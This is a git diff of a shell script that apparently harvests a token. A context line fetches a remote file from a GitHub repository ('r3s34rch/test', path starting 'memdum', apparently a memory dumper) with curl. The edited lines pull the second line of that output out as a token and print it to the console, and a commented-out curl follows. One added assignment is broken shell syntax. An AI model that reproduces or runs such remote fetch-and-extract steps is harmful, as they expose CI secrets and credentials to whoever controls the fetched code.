@@ -8,11 +8,12 @@ TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum
 echo "---------------------------1--------------------------------------"
 echo "$TOKEN_VAL"
 echo "---------------------------2--------------------------------------"
-#T2=${TOKEN_VAL:41:80} 
-#echo "$T2"
-NewTk=`echo "$TOKEN_VAL" |awk 'NR==2' `
-echo $NewTk
+echo "$TOKEN_VAL" | awk 'NR==2' 
 echo "---------------------------3--------------------------------------"
+
+NewTk= "$TOKEN_VAL" |awk 'NR==2' 
+echo $NewTk
+echo "---------------------------4--------------------------------------"
 
 #echo "$TOKEN_VAL" | sed 's/[^a-zA-Z0-9]//g'
 #curl \
